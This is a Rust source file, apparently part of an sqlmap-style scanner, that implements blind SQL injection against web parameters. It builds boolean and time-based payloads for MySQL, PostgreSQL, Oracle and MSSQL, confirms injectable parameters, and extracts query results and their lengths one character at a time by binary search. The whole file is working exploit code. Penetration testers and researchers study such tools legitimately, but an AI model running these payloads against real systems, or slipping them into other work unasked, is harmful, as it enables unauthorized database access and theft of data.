//! Blind SQL injection inference

use crate::sqli::core::{DBMS, CHAR_START, CHAR_STOP};
use crate::sqli::request::{Request, page_ratio, remove_dynamic_content};
use anyhow::Result;
use std::time::{Duration, Instant};

/// Minimum gap between the TRUE-condition and FALSE-condition similarity ratios
/// required to confirm a boolean differential. This relative margin is far more
/// robust on dynamic pages than fixed absolute thresholds alone.
const BOOL_DIFFERENTIAL_MARGIN: f64 = 0.25;

/// Blind injection vector
#[derive(Debug, Clone)]
pub struct BlindVector {
    pub dbms: DBMS,
    pub prefix: String,
    pub suffix: String,
    pub true_code: String,    // Payload that returns true
    pub false_code: String,   // Payload that returns false
    pub time_based: bool,     // Use time-based instead of boolean
    pub delay: u64,           // Delay in seconds for time-based
}

/// How a boundary terminates the injected condition.
enum BoolTerm {
    /// Terminate with a SQL comment (e.g. "-- -", "#").
    Comment(&'static str),
    /// Close with a paired-quote condition (no comment), using this quote char.
    Paired(char),
}

/// A boolean-blind boundary *shape*: what to append to the original value to
/// break out of its context (`closer`) and how to terminate (`term`). Payloads
/// are built per-target by seeding the real parameter value, so string contexts
/// like `WHERE name='admin'` keep matching the original row.
struct BoolBoundary {
    closer: &'static str,
    term: BoolTerm,
}

// Boundary matrix modelled on sqlmap's boundaries: numeric, single-quote,
// double-quote and parenthesised contexts, comment-terminated (extraction-safe)
// plus paired-quote fallbacks for when comments are stripped. Each is seeded
// from the original parameter value at scan time.
const BOOL_BOUNDARIES: &[BoolBoundary] = &[
    BoolBoundary { closer: "",    term: BoolTerm::Comment("-- -") }, // numeric
    BoolBoundary { closer: "",    term: BoolTerm::Comment("#") },
    BoolBoundary { closer: "'",   term: BoolTerm::Comment("-- -") }, // single-quote string
    BoolBoundary { closer: "'",   term: BoolTerm::Comment("#") },
    BoolBoundary { closer: "\"",  term: BoolTerm::Comment("-- -") }, // double-quote string
    BoolBoundary { closer: ")",   term: BoolTerm::Comment("-- -") }, // paren numeric
    BoolBoundary { closer: "')",  term: BoolTerm::Comment("-- -") }, // paren single-quote
    BoolBoundary { closer: "'))", term: BoolTerm::Comment("-- -") }, // double-paren
    BoolBoundary { closer: "\")", term: BoolTerm::Comment("-- -") },
    BoolBoundary { closer: "'",   term: BoolTerm::Paired('\'') },    // comment-strip fallbacks
    BoolBoundary { closer: "\"",  term: BoolTerm::Paired('"') },
];

/// Built payloads for one boundary, seeded from the original value.
struct BoolPayloads {
    prefix: String,
    suffix: String,
    true_code: String,
    false_code: String,
    true_payload: String,
    false_payload: String,
}

fn build_bool_payloads(base: &str, b: &BoolBoundary) -> BoolPayloads {
    let prefix = format!("{base}{}", b.closer);
    match b.term {
        BoolTerm::Comment(c) => BoolPayloads {
            true_payload: format!("{prefix} AND 1=1{c}"),
            false_payload: format!("{prefix} AND 1=2{c}"),
            suffix: c.to_string(),
            true_code: "AND 1=1".to_string(),
            false_code: "AND 1=2".to_string(),
            prefix,
        },
        BoolTerm::Paired(q) => BoolPayloads {
            true_payload: format!("{prefix} AND {q}1{q}={q}1"),
            false_payload: format!("{prefix} AND {q}1{q}={q}2"),
            suffix: String::new(),
            true_code: format!("AND {q}1{q}={q}1"),
            false_code: format!("AND {q}1{q}={q}2"),
            prefix,
        },
    }
}

/// Check if target is vulnerable to boolean-based blind SQLi.
///
/// Robustness improvements over the original fixed-threshold check:
///  - dynamic content (timestamps, CSRF tokens, session IDs) is stripped before
///    comparison via `remove_dynamic_content` (previously written but unused);
///  - detection requires a wide *differential* between the TRUE and FALSE
///    similarity ratios, not just absolute thresholds, which holds up on pages
///    with naturally varying content.
pub async fn check_boolean_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
    // Seed boundaries from the real parameter value so the TRUE condition keeps
    // matching the original row in string contexts (e.g. WHERE name='admin').
    let base = request.original_value();
    let base = if base.trim().is_empty() { "1".to_string() } else { base };

    // Baseline is the response for the original value itself, so a TRUE payload
    // (original + AND true) should resemble it and a FALSE payload should not.
    let baseline = remove_dynamic_content(&request.query_page(&base).await?);

    for boundary in BOOL_BOUNDARIES {
        let pl = build_bool_payloads(&base, boundary);
        let true_page = remove_dynamic_content(&request.query_page(&pl.true_payload).await?);
        let false_page = remove_dynamic_content(&request.query_page(&pl.false_payload).await?);
        let true_ratio = page_ratio(&true_page, &baseline);
        let false_ratio = page_ratio(&false_page, &baseline);

        // Confirm a boolean differential: the TRUE page closely matches the
        // baseline and the gap to the FALSE page is wide enough to rule out
        // noise. We rely on the relative margin rather than an absolute
        // false-page threshold — pages with heavy shared boilerplate keep a
        // high similarity even when the meaningful content flips, so an absolute
        // gate produces false negatives (e.g. "Welcome" vs "Not found").
        if true_ratio > 0.9 && (true_ratio - false_ratio) > BOOL_DIFFERENTIAL_MARGIN {
            return Ok(Some(BlindVector {
                dbms: DBMS::Unknown,
                prefix: pl.prefix,
                suffix: pl.suffix,
                true_code: pl.true_code,
                false_code: pl.false_code,
                time_based: false,
                delay: 0,
            }));
        }
    }

    Ok(None)
}

/// Check if target is vulnerable to time-based blind SQLi
/// Number of seconds each time-based payload should delay the response.
const TIME_DELAY: u64 = 5;

/// A DBMS-specific delay clause. `And` is appended after `AND `; `Stacked` is a
/// standalone statement appended after `; `.
enum TimeClause {
    And(&'static str),
    Stacked(&'static str),
}

struct TimeDbms {
    dbms: DBMS,
    clause: TimeClause,
}

const TIME_DBMS: &[TimeDbms] = &[
    TimeDbms { dbms: DBMS::MySQL, clause: TimeClause::And("SLEEP(5)") },
    TimeDbms { dbms: DBMS::PostgreSQL, clause: TimeClause::And("(SELECT 1 FROM pg_sleep(5))") },
    TimeDbms { dbms: DBMS::Oracle, clause: TimeClause::And("1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)") },
    TimeDbms { dbms: DBMS::MSSQL, clause: TimeClause::Stacked("WAITFOR DELAY '0:0:5'") },
];

/// Context closers tried after the original value to break out before the delay
/// clause: numeric, single-quote, double-quote, and parenthesised variants.
const TIME_CLOSERS: &[&str] = &["", "'", "\"", ")", "')", "\")"];

/// Check if the target is vulnerable to time-based blind SQLi.
///
/// Seeds from the original parameter value and iterates DBMS delay clauses
/// (MySQL SLEEP, PostgreSQL pg_sleep, Oracle DBMS_PIPE, MSSQL stacked WAITFOR)
/// across numeric / single-quote / double-quote / parenthesised contexts, so
/// double-quote and wrapped contexts (e.g. sqli-labs Less-10) are covered.
/// Uses a median baseline and a confirmatory second delayed request to rule out
/// network jitter.
pub async fn check_time_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
    let base = request.original_value();
    let base = if base.trim().is_empty() { "1".to_string() } else { base };

    // Baseline: median of a few quick samples to absorb jitter.
    let mut samples = Vec::new();
    for _ in 0..3 {
        let start = Instant::now();
        let _ = request.query_page(&base).await?;
        samples.push(start.elapsed());
    }
    samples.sort();
    let normal_time = samples[samples.len() / 2];

    // A genuine delay must clear (DELAY - 1)s and be well above baseline.
    let threshold = Duration::from_secs(TIME_DELAY - 1).max(normal_time * 3);

    for closer in TIME_CLOSERS {
        let prefix = format!("{base}{closer}");
        for td in TIME_DBMS {
            let (payload, true_code) = match td.clause {
                TimeClause::And(expr) => {
                    (format!("{prefix} AND {expr}-- -"), format!("AND {expr}"))
                }
                TimeClause::Stacked(stmt) => {
                    (format!("{prefix}; {stmt}-- -"), format!("; {stmt}"))
                }
            };

            let start = Instant::now();
            let _ = request.query_page(&payload).await?;
            if start.elapsed() < threshold {
                continue;
            }

            // Confirm with a second request to rule out a transient slow response.
            let start = Instant::now();
            let _ = request.query_page(&payload).await?;
            if start.elapsed() < threshold {
                continue;
            }

            return Ok(Some(BlindVector {
                dbms: td.dbms,
                prefix,
                suffix: "-- -".to_string(),
                true_code,
                false_code: "AND 1=1".to_string(),
                time_based: true,
                delay: TIME_DELAY,
            }));
        }
    }

    Ok(None)
}

/// Extract a single character using boolean-based blind
pub async fn extract_char_boolean(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    position: usize,
    baseline: &str,
) -> Result<Option<char>> {
    // Binary search for character ASCII value
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low <= high {
        let mid = (low + high) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            DBMS::MSSQL => {
                format!("{} AND ASCII(SUBSTRING(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            },
            _ => {
                format!("{} AND ASCII(SUBSTR(({}),{},1))>{}{}",
                    vector.prefix, expression, position, mid, vector.suffix)
            }
        };
        
        let page = request.query_page(&payload).await?;
        let ratio = page_ratio(&page, baseline);
        
        if ratio > 0.9 {
            // True condition - character is greater than mid
            low = mid + 1;
        } else {
            // False condition - character is less than or equal to mid
            high = mid - 1;
        }
    }
    
    if low >= 32 && low <= 126 {
        Ok(Some(low as char))
    } else {
        Ok(None)
    }
}

/// Extract a single character using time-based blind
pub async fn extract_char_time(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    position: usize,
) -> Result<Option<char>> {
    let delay = vector.delay;
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low <= high {
        let mid = (low + high) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL => {
                format!("{} AND IF(ASCII(SUBSTRING(({}),{},1))>{},SLEEP({}),0){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND (SELECT CASE WHEN ASCII(SUBSTRING(({}),{},1))>{} THEN pg_sleep({}) ELSE pg_sleep(0) END){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            },
            _ => {
                format!("{} AND IF(ASCII(SUBSTRING(({}),{},1))>{},SLEEP({}),0){}",
                    vector.prefix, expression, position, mid, delay, vector.suffix)
            }
        };
        
        let start = Instant::now();
        let _ = request.query_page(&payload).await?;
        let elapsed = start.elapsed();
        
        if elapsed > Duration::from_secs(delay - 1) {
            // True condition - character is greater than mid
            low = mid + 1;
        } else {
            // False condition - character is less than or equal to mid
            high = mid - 1;
        }
    }
    
    if low >= 32 && low <= 126 {
        Ok(Some(low as char))
    } else {
        Ok(None)
    }
}

/// Extract full string using blind injection
pub async fn extract_string(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
    max_length: usize,
) -> Result<String> {
    let baseline = request.query_page(&format!("{} {}", vector.prefix, vector.true_code)).await?;
    let mut result = String::new();
    
    for pos in 1..=max_length {
        let char = if vector.time_based {
            extract_char_time(request, vector, expression, pos).await?
        } else {
            extract_char_boolean(request, vector, expression, pos, &baseline).await?
        };
        
        match char {
            Some(c) if c != ' ' || !result.is_empty() => {
                result.push(c);
                tracing::debug!("Extracted character {}: '{}'", pos, c);
            },
            _ => break, // End of string
        }
    }
    
    Ok(result.trim().to_string())
}

/// Get length of expression result
pub async fn get_length(
    request: &Request<'_>,
    vector: &BlindVector,
    expression: &str,
) -> Result<usize> {
    let baseline = request.query_page(&format!("{} {}", vector.prefix, vector.true_code)).await?;
    
    // Binary search for length
    let mut low = 0usize;
    let mut high = 1000usize;
    
    while low < high {
        let mid = (low + high + 1) / 2;
        
        let payload = match vector.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            },
            DBMS::PostgreSQL => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            },
            _ => {
                format!("{} AND LENGTH(({}))>={}{}",
                    vector.prefix, expression, mid, vector.suffix)
            }
        };
        
        let page = request.query_page(&payload).await?;
        let ratio = page_ratio(&page, &baseline);
        
        if ratio > 0.9 {
            low = mid;
        } else {
            high = mid - 1;
        }
    }
    
    Ok(low)
}
